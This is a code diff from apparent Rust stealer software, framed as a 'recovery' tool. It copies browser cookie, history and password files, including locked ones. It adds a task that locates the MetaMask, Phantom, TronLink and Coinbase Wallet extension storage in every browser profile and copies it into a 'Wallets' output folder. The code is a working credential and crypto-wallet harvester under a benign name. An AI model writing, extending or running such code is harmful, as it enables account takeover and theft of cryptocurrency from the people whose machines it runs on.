@@ -1,4 +1,5 @@
 use crate::recovery::context::RecoveryContext;
+use crate::recovery::fs::copy_dir_limited;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use std::path::{Path, PathBuf};
@@ -168,13 +169,30 @@ impl RecoveryTask for BrowserRecoveryTask {
             match fs::metadata(&candidate).await {
                 Ok(metadata) if metadata.is_file() => {
                     let mut final_path = candidate.clone();
-                    
-                    if matches!(self.kind, BrowserDataKind::Cookies | BrowserDataKind::History | BrowserDataKind::Passwords) {
-                        let temp_dir = ctx.output_dir.join("browsers").join(self.profile.browser.label());
+
+                    if matches!(
+                        self.kind,
+                        BrowserDataKind::Cookies
+                            | BrowserDataKind::History
+                            | BrowserDataKind::Passwords
+                    ) {
+                        let temp_dir = ctx
+                            .output_dir
+                            .join("browsers")
+                            .join(self.profile.browser.label());
                         let _ = std::fs::create_dir_all(&temp_dir);
-                        let dest = temp_dir.join(format!("{}_{}_{}", self.profile.profile_name, self.kind.label(), file_name));
-                        
-                        if super::lockedfile::copy_locked_file(self.profile.browser.process_name(), &candidate, &dest) {
+                        let dest = temp_dir.join(format!(
+                            "{}_{}_{}",
+                            self.profile.profile_name,
+                            self.kind.label(),
+                            file_name
+                        ));
+
+                        if super::lockedfile::copy_locked_file(
+                            self.profile.browser.process_name(),
+                            &candidate,
+                            &dest,
+                        ) {
                             final_path = dest;
                         }
                     }
@@ -201,6 +219,65 @@ impl RecoveryTask for BrowserRecoveryTask {
     }
 }
 
+pub struct BrowserExtensionTask {
+    profile: BrowserProfile,
+}
+
+impl BrowserExtensionTask {
+    pub fn new(profile: BrowserProfile) -> Self {
+        Self { profile }
+    }
+}
+
+const TARGET_EXTENSIONS: &[(&str, &str)] = &[
+    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
+    ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+];
+
+#[async_trait]
+impl RecoveryTask for BrowserExtensionTask {
+    fn label(&self) -> String {
+        format!(
+            "{browser}/{profile} - Extensions",
+            browser = self.profile.browser.label(),
+            profile = self.profile.profile_name
+        )
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Wallets
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let local_ext_settings = self.profile.path.join("Local Extension Settings");
+
+        if fs::metadata(&local_ext_settings).await.is_err() {
+            return Ok(artifacts);
+        }
+
+        for (name, id) in TARGET_EXTENSIONS {
+            let extension_dir = local_ext_settings.join(id);
+            if fs::metadata(&extension_dir).await.is_ok() {
+                let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
+                    "{}_{}_{}",
+                    self.profile.browser.label(),
+                    self.profile.profile_name,
+                    name
+                ));
+                fs::create_dir_all(&dest_root).await?;
+
+                copy_dir_limited(&extension_dir, &dest_root, name, &mut artifacts, usize::MAX, 0)
+                    .await?;
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
 pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
 
@@ -212,6 +289,7 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
                     Arc::new(BrowserRecoveryTask::new(profile.clone(), kind));
                 tasks.push(task);
             }
+            tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
         }
     }
 
